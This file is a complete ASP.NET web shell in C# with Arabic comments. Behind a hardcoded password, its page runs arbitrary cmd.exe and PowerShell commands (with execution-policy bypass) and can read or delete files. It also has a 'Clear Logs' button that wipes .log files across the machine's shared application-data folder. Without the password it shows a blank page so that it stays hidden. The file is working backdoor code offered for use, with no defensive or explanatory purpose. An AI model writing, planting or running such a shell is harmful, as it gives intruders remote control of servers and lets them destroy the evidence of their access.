<%@ Page Language="C#" Debug="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request["password"] != null && Request["password"] == "28112016")
        {
            string lastCommand = Request["execute"] ?? ""; // احفظ آخر أمر مدخل
            string filePathCommand = Request["filepath"] ?? ""; // مسار الملف المطلوب

            Response.Write(@"
                <div style='position: fixed; top: 0; left: 0; width: 100%; background-color: #111; padding: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.7); color: #0f0;'>
                    <form method='get' style='display: flex; align-items: center;'>
                        <label for='commandInput' style='margin-right: 10px; font-weight: bold;'>Command:</label>
                        <input type='text' id='commandInput' name='execute' style='flex: 1; padding: 10px; border: 1px solid #444; border-radius: 5px; background-color: #222; color: #0f0; font-size: 16px;' value='" + Server.HtmlEncode(lastCommand) + @"' autofocus />
                        <input type='hidden' name='password' value='28112016' />
                        <input type='submit' value='Execute' style='margin-left: 15px; padding: 10px 20px; border: 1px solid #444; border-radius: 5px; background-color: #333; color: #0f0; font-size: 16px; cursor: pointer;' />
                    </form>
                    <form method='get' style='display: flex; align-items: center; margin-top: 10px;'>
                        <label for='filePathInput' style='margin-right: 10px; font-weight: bold;'>File Path:</label>
                        <input type='text' id='filePathInput' name='filepath' style='flex: 1; padding: 10px; border: 1px solid #444; border-radius: 5px; background-color: #222; color: #0f0; font-size: 16px;' value='" + Server.HtmlEncode(filePathCommand) + @"' />
                        <input type='hidden' name='password' value='28112016' />
                        <input type='submit' name='action' value='Read File' style='margin-left: 15px; padding: 10px 20px; border: 1px solid #444; border-radius: 5px; background-color: #333; color: #0f0; font-size: 16px; cursor: pointer;' />
                        <input type='submit' name='action' value='Delete File' style='margin-left: 10px; padding: 10px 20px; border: 1px solid #444; border-radius: 5px; background-color: #f00; color: #fff; font-size: 16px; cursor: pointer;' />
                    </form>
                    <form method='get' style='display: flex; align-items: center; margin-top: 10px;'>
                        <label for='powershellCommand' style='margin-right: 10px; font-weight: bold;'>PowerShell Command:</label>
                        <input type='text' id='powershellCommand' name='powershell' style='flex: 1; padding: 10px; border: 1px solid #444; border-radius: 5px; background-color: #222; color: #0f0; font-size: 16px;' />
                        <input type='hidden' name='password' value='28112016' />
                        <input type='submit' value='Run PowerShell' style='margin-left: 15px; padding: 10px 20px; border: 1px solid #444; border-radius: 5px; background-color: #333; color: #0f0; font-size: 16px; cursor: pointer;' />
                    </form>
                    <form method='get' style='display: flex; align-items: center; margin-top: 10px;'>
                        <input type='hidden' name='password' value='28112016' />
                        <input type='submit' name='action' value='Clear Logs' style='padding: 10px 20px; border: 1px solid #444; border-radius: 5px; background-color: #333; color: #f00; font-size: 16px; cursor: pointer;' />
                    </form>
                </div>
                <div style='margin-top: 240px; padding: 20px;'>
            ");

            if (!string.IsNullOrEmpty(lastCommand))
            {
                try
                {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "cmd.exe";
                    psi.Arguments = "/c " + lastCommand;
                    psi.RedirectStandardOutput = true;
                    psi.RedirectStandardError = true;
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;

                    Process process = Process.Start(psi);
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    Response.Write("<pre style='background-color: #000; color: #0f0; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>" + Server.HtmlEncode(output) + "</pre>");
                    if (!string.IsNullOrEmpty(error))
                    {
                        Response.Write("<pre style='background-color: #000; color: #f00; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>" + Server.HtmlEncode(error) + "</pre>");
                    }
                }
                catch (Exception ex)
                {
                    Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
                }
            }

            if (Request["action"] == "Clear Logs")
            {
                try
                {
                    // مسح السجلات من مجلد السجلات
                    string[] logFiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "*.log", SearchOption.AllDirectories);
                    foreach (string logFile in logFiles)
                    {
                        File.Delete(logFile);
                    }
                    Response.Write("<pre style='color: lime; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px;'>Logs cleared successfully.</pre>");
                }
                catch (Exception ex)
                {
                    Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
                }
            }

            if (!string.IsNullOrEmpty(Request["powershell"]))
            {
                try
                {
                    string psCommand = Request["powershell"];
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "powershell.exe";
                    psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command " + psCommand;
                    psi.RedirectStandardOutput = true;
                    psi.RedirectStandardError = true;
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;

                    Process process = Process.Start(psi);
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    Response.Write("<pre style='background-color: #000; color: #0f0; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>" + Server.HtmlEncode(output) + "</pre>");
                    if (!string.IsNullOrEmpty(error))
                    {
                        Response.Write("<pre style='background-color: #000; color: #f00; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>" + Server.HtmlEncode(error) + "</pre>");
                    }
                }
                catch (Exception ex)
                {
                    Response.Write("<pre style='color:red; background-color: #000; padding: 15px; font-family: Consolas, monospace; border: 1px solid #444; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; max-height: none; height: auto;'>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
                }
            }

            Response.Write("</div>");
        }
        else
        {
            Response.Clear();
        }
    }
</script>

<html>
<head>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
        }

        input[type='text'] {
            transition: box-shadow 0.3s ease;
        }

        input[type='text']:focus {
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
        }

        input[type='submit'] {
            transition: background-color 0.3s ease;
        }

        input[type='submit']:hover {
            background-color: #444;
        }

        /* تحسين تجربة التمرير لمخرجات الأوامر */
        pre {
            overflow-y: auto;
        }
    </style>
</head>
<body>
</body>
</html>
